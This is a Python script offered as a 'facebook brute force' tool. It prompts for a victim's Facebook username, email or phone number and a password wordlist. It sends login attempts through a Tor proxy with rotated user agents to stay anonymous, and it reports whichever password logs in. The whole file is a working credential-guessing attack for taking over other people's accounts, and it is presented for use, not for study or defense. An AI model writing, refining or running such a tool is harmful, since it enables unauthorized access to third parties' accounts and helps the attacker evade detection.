import os
import sys
import mechanize
import cookielib
import random
import socket
from sys import platform
from os  import system
def logo():


  print '======================================================='
  print '=          create by hacker ghost                     ='
  print '======================================================='
  print '=          facebook brute force                       ='
  print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++'
  print '=                     V.1.0                           ='
  print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++'
  print '=  contact me on telegram https://t.me/nahom_0ghost   ='
  print '======================================================='

system('clear')
logo()

print(" open tor browser this tool need tor for anonymous login")

print '[1] start the attack'
print '[2]exit'
option = input("==>")

if option == 1:
    system('clear')

else:
    system('clear')
    logo()
    print 'thanks for using the tool'
    exit()
logo()

email = raw_input("Enter the Facebook Username (or) Email (or) Phone Number : ")

passwordlist = raw_input("Enter the wordlist name or path : ")

login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
    global br
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.set_proxies({"socks":"127.0.0.1:9150"})
    system('clear')
    logo()
    search()
    print("Password does not exist in the wordlist")



def brute(password):
    sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr = 0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    cookies = cookielib.CookieJar()
    cookies.clear_session_cookies()
    if log != login and (not 'login_attempt' in log):
            print("\n\n[+] Password Find = {}".format(password))
            raw_input("ANY KEY to Exit....")
            sys.exit(1)


def search():
    global password
    passwords = open(passwordlist,"r")
    for password in passwords:
        password = password.replace("\n","")
        brute(password)

    total = open(passwordlist,"r")
    total = total.readlines()
    logo()
    print (" [*] Account to crack : {}".format(email))
    print (" [*] Loaded :" , len(total), "passwords")
    print (" [*] Cracking, please wait ...\n\n")


if __name__ == '__main__':
    main()
